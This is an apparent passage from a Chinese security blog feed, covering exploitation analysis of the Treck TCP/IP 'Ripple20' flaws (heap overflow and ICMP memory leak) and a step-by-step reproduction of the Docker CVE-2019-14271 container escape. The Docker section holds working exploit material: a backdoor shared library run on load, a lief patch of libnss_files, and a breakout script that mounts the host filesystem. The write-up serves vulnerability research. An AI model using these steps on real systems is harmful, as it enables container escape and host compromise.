</p><p><em>•</em> 总长度（2个字节）：整个IP数据包的大小，以字节（或IP片段，如果是分段的）为单位，包括报头。  </p><p>函数tfIpIncomingPacket 从一些基本的健全性检查开始。除了验证标头校验和之外，它还验证：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip_version &#x3D;&#x3D; 4 &amp;&amp; data_available &gt;&#x3D; 21 &amp;&amp; header_length &gt;&#x3D; 20 &amp;&amp; total_length &gt; header_length &amp;&amp; total_length &lt;&#x3D; data_available</span><br></pre></td></tr></table></figure><p>“可用数据”是使用字段pktuChainDataLength测量的。<br>如果所有健全性检查都通过，该函数将检查IP报头中指定的总长度是否严格小于数据包的pktuChainDataLength，表明实际接收的数据多于IP报头中所述的数据。如果为真，则执行修剪操作以删除额外数据：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((uint)ipTotalLength &lt;= pkt-&gt;pktuChainDataLength) &#123; <span class="keyword">if</span> ((uint)ipTotalLength != pkt-&gt;pktuChainDataLength) &#123;</span><br><span class="line">pkt-&gt;pktuChainDataLength = (uint)ipTotalLength; </span><br><span class="line">pkt-&gt;pktuLinkDataLength = (uint)ipTotalLength;</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这就是漏洞所在。回想一下，pktuLinkDataLength保存当前片段的大小，pktuChainDataLength保存整个数据包的大小。如果执行上述操作，则会创建不一致，其中pkt-&gt;pktuChainDataLength。<br>==pkt-&gt;pktuLinkDataLength，但可能有其他片段指向。<br>pkt-&gt;pktuLinkNextPtr.。另一种方式是将其视为一种虚构的不一致状态，其中链表上片段的总大小大于pktuChainDataLength中存储的大小。<br>由弱修剪操作产生的不一致对于处理的其余部分来说不是好兆头。然而，我们还有另一个挑战需要克服。每次使用一个接收到的片段调用tfIpIncomingPacket函数，并调用tfIpReAssemblePacket来处理它。tfIpReAssemblePacket负责将片段插入到上述链表中。它不会将片段复制到连续的内存缓冲区。收到所有片段后，tfIpReAssemblePacket以片段链接列表的形式返回完整的数据包，以便在下一个协议层进行进一步处理。该重组操作在易受攻击的修剪操作之后执行。一旦可靠的操作完成，tfIpIncomingPacket将返回或转发数据包，以便在下一网络层(例如：UDP)进行处理。这会阻止我们执行利用漏洞攻击，因为我们需要分段的数据包才能达到不一致的状态。换句话说，易受攻击的代码应该只在每个片段的基础上执行(或在单个片段的数据包上执行)。如果以这种方式执行，它实际上并不容易受到攻击。<br>那么，我们如何才能用传入的碎片数据触发易受攻击的修剪流，从而实现上述不一致呢？</p><h4 id="在IP层处理分段数据包"><a href="#在IP层处理分段数据包" class="headerlink" title="在IP层处理分段数据包"></a>在IP层处理分段数据包</h4><p>为了使分段的数据包在IP层得到处理并到达易受攻击的流，我们使用隧道。<br>隧道允许tfIpIncomingPacket将内部IP数据包作为非分段数据包进行处理。函数tfIpIncomingPacket将被递归调用两次，一次用于IP隧道的内层，多次用于外层(每个片段一次)。首先，tfIpIncomingPacket将接收来自外层的所有片段，在每个片段上调用tfIpReAssemblePacket，一旦它们都被接收，它将把执行传递到下一个协议层，在本例中再次是IPv4，因此将从具有内部IP层的tfIpIncomingPacket调用tfIpIncomingPacket。</p><p><a href="https://lh5.googleusercontent.com/xX_OIWoDTddPFXkKXpjKXd5tROmOlFf7V-xipWAHODKoI1Ke_dk23YSytZYHTHZ50I67C4hCKqbHbQzaGBKXi5u24BTDy_ulnsLTbgHyKxXtKB0UfS8Yec-Jz01QcISgvik_I5Y" title="img" class="gallery-item"><img src="https://lh5.googleusercontent.com/xX_OIWoDTddPFXkKXpjKXd5tROmOlFf7V-xipWAHODKoI1Ke_dk23YSytZYHTHZ50I67C4hCKqbHbQzaGBKXi5u24BTDy_ulnsLTbgHyKxXtKB0UfS8Yec-Jz01QcISgvik_I5Y" alt="img"></a></p><p>对外部IP分组进行分段会导致使用内部分组调用tfIpIncomingPacket，该内部分组现在由几个分段组成，但在IP报头中标记为未分段(MF=0)。就描述数据包的数据结构而言，它现在由链接列表中的几个单独的链接组成，每个链接都有一个单独的pktuLinkDataLength值。</p><p>让我们说得更具体些。请考虑下面的示例，它将伴随我们完成本文：</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200630192657.png" title="image-20200630192655708" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200630192657.png" alt="image-20200630192655708"></a></p><p>(我们将 checksum 字段设置为0，因为这将导致跳过UDP校验和验证。)。<br>当网络堆栈处理外部片段时，它使用字段将它们链接起来。<br>如前所述，tsUserPacket结构中的pktuLinkNextPtr。当函数tfIpIncomingPacket处理内部IP包(由于协议=4)时，它正在处理传入的分片数据(内部IP包由两个链接在一起的tsPacket结构表示)，但仍会调用易受攻击的流，从而解决了我们的挑战。<br>此外，内部IP分组通过IP报头健全性检查，因为只考虑tsUserPacket的pktuChainDataLength字段(而不是pktuLinkDataLength)。在我们的示例中，内部IP数据包(32)的总长度较小。<br>超过链数据长度(1000+8+20=1028)，因此Treck堆栈将通过将字段pktuLinkDataLength和pktuChainDataLength设置为相同的值-总IP长度(在我们的示例中为32)，来尝试不正确地修剪数据包。这导致内部IP分组由链接在一起的两个tsPacket结构表示，但是它们的总CUSIZE大于pktuChainDataLength字段(pktuChainDataLength字段在修整后等于32，而不是1028字节)。</p><p><a href="https://lh3.googleusercontent.com/1AvUvDvuhRYsbIROhXpYD1sVtZA7VL1PV5I11ZHdDiIBT2-K2PpJfq4ousnjqaHhyr7DeSL-dhpQnA1b1SvBsYCjkeTTuCAhT-b5k65-71DlHm-RxGUSaoeeMnZXQdkbnk3mrU8" title="img" class="gallery-item"><img src="https://lh3.googleusercontent.com/1AvUvDvuhRYsbIROhXpYD1sVtZA7VL1PV5I11ZHdDiIBT2-K2PpJfq4ousnjqaHhyr7DeSL-dhpQnA1b1SvBsYCjkeTTuCAhT-b5k65-71DlHm-RxGUSaoeeMnZXQdkbnk3mrU8" alt="img"></a></p><h4 id="利用UDP实现堆溢出"><a href="#利用UDP实现堆溢出" class="headerlink" title="利用UDP实现堆溢出"></a>利用UDP实现堆溢出</h4><p>既然我们已经达到了不一致的状态，我们就面临着另一个问题–我们如何利用这种不一致来获得内存损坏原语？<br>原来，至少有一条代码路径将碎片数据复制到单个连续缓冲区中。这是处理UDP数据报的代码的一部分。该流的内部逻辑由正在分配的新分组(使用tfGetSharedBuffer)组成，其大小基于pktuChainDataLength字段，随后是分组的不同片段的副本逐个进入新分配的分组。<br>负责执行复制的函数是tfCopyPacket，它按顺序接受源包和目的包。以下是片段复制代码的摘录：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">i = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line"><span class="built_in">memcpy</span>(dst-&gt;pktuLinkDataPtr + i,src-&gt;pktuLinkDataPtr,src-&gt;pktuLinkDataLength); i = i + src-&gt;pktuLinkDataLength;</span><br><span class="line">src = (tsPacket *)src-&gt;pktuLinkNextPtr;</span><br><span class="line">&#125; <span class="keyword">while</span> (src != <span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure><p>如您所见，函数tfCopyPacket没有考虑它写入的缓冲区的长度。它只是从src包(我们的分段包)中提取每个链接，并将其数据复制到目标包中。目标数据包是根据pktuChainDataLength分配的，因此如果之前触发了该漏洞，则在我们的无效之后，分配的缓冲区可能小于数据包中所有单个链接的总和-因此，会发生堆溢出。</p><p>还有一件事需要描述，那就是我们如何触发这一流程。</p><p>如果应用程序正在侦听任何UDP端口，则发往该端口的UDP数据包将被传递给套接字处理函数tfSocketIncomingPacket。其任务是将数据包附加到套接字接收队列(稍后由应用层轮询)。</p><p>在我们的研究中，我们发现当UDP数据包的套接字接收队列非空并且有新的数据包到达时，上述包含堆溢出的流是可以实现的。请看tfSocketIncomingPacket的以下摘录：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">ocal_10 = pkt;</span><br><span class="line"><span class="comment">/* ... */</span></span><br><span class="line"><span class="keyword">if</span> (sockEntry-&gt;socReceiveQueueNextPtr == <span class="literal">NULL</span>) &#123; sockEntry-&gt;socReceiveQueueNextPtr = pkt; queueLastPtr = local_10;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">queueLastPtr = sockEntry-&gt;socReceiveQueueLastPtr;</span><br><span class="line"><span class="keyword">if</span> ((queueLastPtr-&gt;pktSharedDataPtr-&gt;dataFlags &amp; <span class="number">0x40</span>) == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="comment">/* Shared data doesn&#x27;t point to user device memory */</span></span><br><span class="line">sizeOfPacketBuffer = (uint)(pkt-&gt;pktSharedDataPtr-&gt;dataBufLastPtr +</span><br><span class="line">‹→ -(<span class="keyword">int</span>)pkt-&gt;pktSharedDataPtr-&gt;dataBufFirstPtr);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (protoNum == <span class="number">6</span>) &#123;</span><br><span class="line"><span class="comment">/* Related to TCP; redacted for brevity */</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (sizeOfPacketBuffer != <span class="number">0</span>) &#123;</span><br><span class="line">uVar2 = (uint)sockEntry-&gt;socRecvCopyFraction * pkt-&gt;pktuChainDataLength; <span class="keyword">if</span> (uVar2 &lt;= sizeOfPacketBuffer) &#123;</span><br><span class="line">dst = tfGetSharedBuffer(<span class="number">0x54</span>,pkt-&gt;pktuChainDataLength,<span class="number">0</span>); <span class="keyword">if</span> (dst != <span class="literal">NULL</span>) &#123;</span><br><span class="line">tfCopyPacket(pkt,dst); needToDrop = <span class="literal">true</span>; local_10 = dst;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">queueLastPtr-&gt;pktChainNextPtr = local_10; queueLastPtr = local_10;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我们看到，为了到达tfGetSharedBuffer，我们需要绕过涉及到ocRecvCopyFraction的检查。我们不知道它的确切用途，但通过调试和实验，我们发现它的值是4(在我们的情况下)。</p><p>在我们反复出现的示例中，我们的第一个数据包链路的缓冲区大小很小，因此SizzeOfPacketBuffer。<br>相对较小(大约10s字节)。<br>但是当我们到达该流时，pkt-&gt;pktuChainDataLength等于4(修剪后为32，然后在处理IP层时递减20(IP报头的大小)，然后再次递减8(UDP报头的大小))。因此，4*4=16小于sizeOfPacketBuffer，我们通过此检查。<br>我们需要确保的最后一件事是UDP数据包的接收队列是非空的(否则无法到达此流)。在理论上，有几种方法可以做到这一点。在我们的攻击中，我们发现将多个UDP数据包足够快地发送到同一端口就可以做到这一点。然而，要让这一部分可靠地工作是很棘手的。该漏洞是用Python编写的，使用的Scapy对于我们的目的来说太慢了。为了克服这个障碍，我们使用了Scapy的L3Socket对象，并实例化了一堆线程，这些线程只会用良性的UDP数据包淹没设备，因此套接字接收队列将是非空的。用C或GO编写代码可能也可以。根据要利用的设备和侦听服务器，可以对此部分进行其他改进。<br>另一个障碍是，在我们到达发生溢出的tfSocketIncomingPacket之前，易受攻击的数据包通过tfUdpIncomingPacket。此函数包含一些与UDP相关的健全性检查，因此我们还需要通过这些检查：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">udpLen &#x3D; udpHdr-&gt;udpLength &gt;&gt; 8 | udpHdr-&gt;udpLength &lt;&lt; 8;</span><br><span class="line">if ((udpLen &lt; 8) || (*(ushort  *)&amp;pkt-&gt;pktuChainDataLength  &lt;  udpLen))  goto  dropPacket; if (udpLen &lt; *(ushort *)&amp;pkt-&gt;pktuChainDataLength) &#123;</span><br><span class="line">tfPacketTailTrim(pkt,(uint)udpLen,0);</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;* ... *&#x2F;</span><br><span class="line">if ((udpHdr-&gt;udpChecksum !&#x3D; 0) &amp;&amp; (tvUdpIncomingChecksumOn !&#x3D; 0)) &#123;</span><br><span class="line">&#x2F;* Compute checksum... *&#x2F;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>正如我们所看到的，通过确保UDP长度字段等于pktuChainDataLength字段减去内部IP报头的大小，我们可以避免这种类型的修剪(不要与易受攻击的流混淆)。<br>总而言之：如果我们的设备上有UDP端口在监听，我们可以快速发送数据包，这样套接字接收队列就不会为空。同时，我们将发送会触发该漏洞的零碎UDP数据包，并勾选几个复选框。我们预期的结果是使用tfGetSharedBuffer在堆上分配一个小缓冲区，然后tfCopyPacket会使其溢出。</p><h2 id="CVE-2020-11898"><a href="#CVE-2020-11898" class="headerlink" title="CVE-2020-11898"></a>CVE-2020-11898</h2><p>前面提到了，Treck TCP/IP不能正确处理IP-in-IP隧道上传入的IPv4片段。这还可能允许未经验证的攻击者从 heap 中泄漏内存。</p><p>如果 tfIcmpErrPacket 将越界数据复制到错误数据包中，则可作为信息泄漏漏洞来被利用。</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200630213503.png" title="image-20200630213501855" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200630213503.png" alt="image-20200630213501855"></a></p><p>参考如上实例：</p><p>当网络堆栈接收到这两个片段时，它会使用tfIpReAssemblePacket重新组装它们。此函数使用tsUserPacket结构中的字段pktuLinkNextPtr链接两个片段。如果启用了隧道，则IP层接下来将在函数tfIpIncomingPacket中处理内部IP数据包。</p><p>内部IP分组通过IP报头健全性检查，因为只考虑tsUserPacket的pktuChainDataLength字段(而不是pktuLinkDataLength)。此外，由于在标准IP报头(20字节)之后有4个空字节，并且空字节表示选项列表的末尾(见<a href="https://tools.ietf.org/html/rfc791)%EF%BC%8C%E5%9B%A0%E6%AD%A4IP%E9%80%89%E9%A1%B9%E8%A7%A3%E6%9E%90%E9%80%9A%E8%BF%87%E3%80%82">https://tools.ietf.org/html/rfc791)，因此IP选项解析通过。</a></p><p>如果内部IP数据包的IP报头中的总长度字段严格小于链数据长度，则网络堆栈将尝试修剪数据包。如前文中所述，修剪是通过将字段pktuLinkDataLength和pktuChainDataLength设置为相同的值，即总长度字段(在我们的示例中为100)来实现的。</p><p>由于内部IP数据包包含无效的IPv4协议号(协议0)，因此网络堆栈将通过发送类型为3(目的地不可达)代码为2(协议不可达)的ICMP错误消息来拒绝该数据包。</p><p>负责创建错误数据包的函数是tfIcmpErrPacket。它会分配一个新数据包，初始化一些ICMP字段，并最终从违规数据包(内部IP数)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">length   =   (packetPtr-&gt;pktUserStruct).pktuLinkDataLength; <span class="keyword">if</span> (headerLengthInBytes + <span class="number">8</span> &lt;= length) &#123;</span><br><span class="line">length = headerLengthInBytes + <span class="number">8</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">memcpy</span>(icmpErrHdrPtr + <span class="number">8</span>, pktIpHdrPtr, length);</span><br></pre></td></tr></table></figure><p>正如我们所看到的，tfIcmpErrPacket通过取IP报头长度(以字节为单位)加8(在我们的示例中，60+8=68)和pktuLinkDataLength字段(在本例中修剪为100)之间的最小值来计算要复制的字节数。由于违规数据包的第一个片段的实际链接数据长度为24(不是100)，tfIcmpErrPacket将复制68−24=44字节从堆中泄漏的数据。</p><p>此漏洞可用于在启用漏洞缓解(如ASLR)时，以及在没有调试器的情况下，利用CVE2020-11896和其他RCE漏洞进行攻击。</p><p>2020-7-2 更新</p><p>试了下文章写的 poc 发现并没有任何返回，但是机器直接打崩了。等个可以调试的设备。</p><h2 id="关于-treck-协议栈扫描"><a href="#关于-treck-协议栈扫描" class="headerlink" title="关于 treck 协议栈扫描"></a>关于 treck 协议栈扫描</h2><p>看到 启明星辰 ADLAB 的公众号提到了 Treck协议栈自定义了类型为165(0xa5)的ICMP包，并一旦收到165的ICMP包会回复类型为166的ICMP包响应。<a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200630215750.webp" title="img" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200630215750.webp" alt="img"></a></p><p>由于手头没有相应的设备，以及查下公司的打印机相关设备，似乎都没有在官方公告的影响范围内，所以用这个方法跑了下，就到目前写这篇文章为止了，大概跑了1000多个 IP ，没有任何返回，目前猜测，公网 scan 的 话可能会被网关给 drop 掉。</p><p>2020-7-2 更新：</p><p>昨天发现上海公司有一台设备，测试的时候发现 scapy 写的扫描是有问题的，scapy 本身似乎对包进行了判断，导致拿不到回包，所以 github 上公开的扫描应该是不行，另外一点 ttl 如果太小似乎也会被drop掉(在多层路由的情况下)</p><p>这里贴一下我用 socket 写的脚本</p><p>设置 ICMP_ECHO_REQUEST 为0xa5 ，然后再收包判断 type</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200702112743.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200702112743.png"></a></p><p>例：</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200702214200.png" title="image-20200702113751286" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200702214200.png" alt="image-20200702113751286"></a></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.jsof-tech.com/wp-content/uploads/2020/06/JSOF_Ripple20_Technical_Whitepaper_June20.pdf">https://www.jsof-tech.com/wp-content/uploads/2020/06/JSOF_Ripple20_Technical_Whitepaper_June20.pdf</a></p><p><a href="https://mp.weixin.qq.com/s/2F1-35HIk126crowAh9LLw">https://mp.weixin.qq.com/s/2F1-35HIk126crowAh9LLw</a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css&quot; /&gt;&lt;div class=&quot;.article</summary>
      
    
    
    
    <category term="漏洞分析" scheme="https://bestwing.me/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
    <category term="CVE-2020-11896" scheme="https://bestwing.me/tags/CVE-2020-11896/"/>
    
    <category term="CVE-2020-11898" scheme="https://bestwing.me/tags/CVE-2020-11898/"/>
    
    <category term="Treck" scheme="https://bestwing.me/tags/Treck/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2019-14271 docker escape</title>
    <link href="https://bestwing.me/CVE-2019-14271-docker-escape.html"/>
    <id>https://bestwing.me/CVE-2019-14271-docker-escape.html</id>
    <published>2020-06-02T16:00:00.000Z</published>
    <updated>2020-06-22T18:00:38.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<blockquote><p><a href="https://github.com/moby/moby/pull/39612">https://github.com/moby/moby/pull/39612</a></p></blockquote><h2 id="github-issue："><a href="#github-issue：" class="headerlink" title="github issue："></a>github issue：</h2><p>Initialize nss libraries in Glibc so that the dynamic libraries are loaded in the host environment not in the chroot from untrusted files.</p><p><a href="https://nvd.nist.gov/vuln/detail/CVE-2019-14271">CVE-2019-14271</a> may allow unprivileged access to host system while copying files from a malicious container image with <code>docker cp</code> command.</p><p><strong>Affected versions</strong>: v19.03.0. Older Docker versions are not affected by this issue.</p><p>This fix is included in the already released <a href="https://github.com/docker/docker-ce/releases/v19.03.1">Docker v19.03.1</a>. Users of Docker v19.03.0 are advised to upgrade.</p><p>The patch was previously reviewed internally by maintainers under GitHub security advisory.If you find security issues in Moby, please follow responsible disclosure guidelines by sending an email to <a href="mailto:security@docker.com">security@docker.com</a>.</p><p>yum list docker-ce –showduplicates|sort –r</p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这两天和 @explorer 一起看了下这个洞，以及好久没更博客了，随手写个文章记录下：</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>漏洞成因是由于，<code>docker cp</code>  进行拷贝的时候，将 <code>docker-tar</code> 此进程先 chroot 到容器内，然而此时使用的 so 文件也是容器内的，而 <code>docker-tar</code> 进程本身没有容器化，意味着仍然拥有高权限，所以此时如果容器内的 so 被恶意篡改，那么可能造成 docker 容器逃逸 </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker cp cve-2019-14271:/lib ./lib &amp; <span class="keyword">while</span> <span class="literal">true</span>; <span class="keyword">do</span> ps -auxf |grep -v grep|grep docker-tar|tr -s <span class="string">&#x27; &#x27;</span>|cut -d <span class="string">&#x27; &#x27;</span> -f 2|xargs -I&#123;&#125; ls -al /proc/&#123;&#125;/root ; <span class="keyword">done</span> |  uniq</span><br></pre></td></tr></table></figure><p>通过上述命令可以清晰的看到 chroot 过程</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200603183320.png" title="chroot" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200603183320.png" alt="chroot"></a></p><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>安装 apt 依赖包，用于通过HTTPS来获取仓库: </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install \</span><br><span class="line">    apt-transport-https \</span><br><span class="line">    ca-certificates \</span><br><span class="line">    curl \</span><br><span class="line">    gnupg-agent \</span><br><span class="line">    software-properties-common</span><br></pre></td></tr></table></figure><p>添加 Docker 的官方 GPG 密钥：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -</span><br></pre></td></tr></table></figure><p>使用以下指令设置稳定版仓库</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo add-apt-repository \</span><br><span class="line">   <span class="string">&quot;deb [arch=amd64] https://download.docker.com/linux/ubuntu \</span></span><br><span class="line"><span class="string">  <span class="subst">$(lsb_release -cs)</span> \</span></span><br><span class="line"><span class="string">  stable&quot;</span></span><br></pre></td></tr></table></figure><p>列出 <code>docker-ce</code> 的所有版本 </p><p><code>apt-cache madison docker-ce</code></p><p>安装有漏洞的版本：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install docker-ce=5:19.03.0~3-0~ubuntu-bionic docker-ce-cli=5:19.03.0~3-0~ubuntu-bionic containerd.io</span><br></pre></td></tr></table></figure><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>由于是 <code>docker-cp</code> 这个进程出现的问题，其本身用到了 <code>libnsss_*.so*</code> 的一些库，所以我们选择对其进程 so 劫持</p><p>劫持代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="keyword">void</span> __attribute__((constructor)) back() </span><br><span class="line">&#123;     </span><br><span class="line"> FILE *proc_file = fopen(<span class="string">&quot;/proc/self/exe&quot;</span>,<span class="string">&quot;r&quot;</span>);   </span><br><span class="line"> <span class="keyword">if</span> (proc_file !=<span class="literal">NULL</span>)    &#123;   </span><br><span class="line">                fclose(proc_file);       </span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"> &#125;</span><br><span class="line"><span class="keyword">else</span>&#123;        </span><br><span class="line">system(<span class="string">&quot;/breakout&quot;</span>);        </span><br><span class="line"><span class="keyword">return</span> ;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于程序在执行的时候，有chroot 过程，避免其他进程也使用了这些库，所以先判断 <code>/proc/self/exe</code> 是否可读，如果可读则不是我们的目标进程</p><p>另外这里用到了 <code>constructor</code> 魔术方法，之前在 geekpwn maxhub 利用的时候也提到了，这里不再赘述。</p><p>patch <code>libss_files-2.27.so</code> 代码, 这里使用 lief 进行 patch</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> lief</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>lief.parse(<span class="string">&quot;./libnss_files-2.27.so&quot;</span>)</span><br><span class="line">&lt;lief.ELF.Binary object at <span class="number">0x7f749704f030</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a= lief.parse(<span class="string">&quot;./libnss_files-2.27.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a.add_library(<span class="string">&quot;/tmp/a.out&quot;</span>)</span><br><span class="line">&lt;lief.ELF.DynamicEntryLibrary object at <span class="number">0x7f74963d9ae8</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a.write(<span class="string">&quot;libnss_files-2.27.so.patch&quot;</span>)</span><br></pre></td></tr></table></figure><p>然后将上面的 c 代码进行编译</p><p><code>gcc -shared -fPIC backdoor.c</code></p><p>首先，创建一个容器作为攻击目标</p><p><code>docker run --rm -it --name cve-2019-14271 ubuntu:18.04 /bin/bash</code></p><p>然后将修改后的 so 和利用的脚本放入容器内：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker cp a.out cve-2019-14271:/tmp </span><br><span class="line">docker cp breakout cve-2019-14271:/ </span><br><span class="line">docker cp libnss_files.so.2_patch cve-2019-14271:/lib/x86_64-linux-gnu/libnss_files-2.27.so</span><br></pre></td></tr></table></figure><p>此时 breakout的内容为：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mkdir /host_fs</span><br><span class="line">mount -t proc none /proc</span><br><span class="line"><span class="built_in">cd</span> /proc/1/root</span><br><span class="line">mount --<span class="built_in">bind</span> . /host_fs</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;hack by chaitin&quot;</span> &gt; /proc/1/root/tmp/hack</span><br></pre></td></tr></table></figure><p>则意味着，攻击成功有两个标志：</p><p>1、容器内的 /host_fs 映射了容器外的内容</p><p>2、容器外的 tmp 的 hack 写入 <code>hack by chaitin</code></p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200603183342.png" title="mount-root-fs-to" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200603183342.png" alt="mount-root-fs-to"></a></p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200603183355.png" title="docker%20CVE%202019%2014271%20040822a50127454aac6713a0750ab5fb/Untitled%202.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200603183355.png" 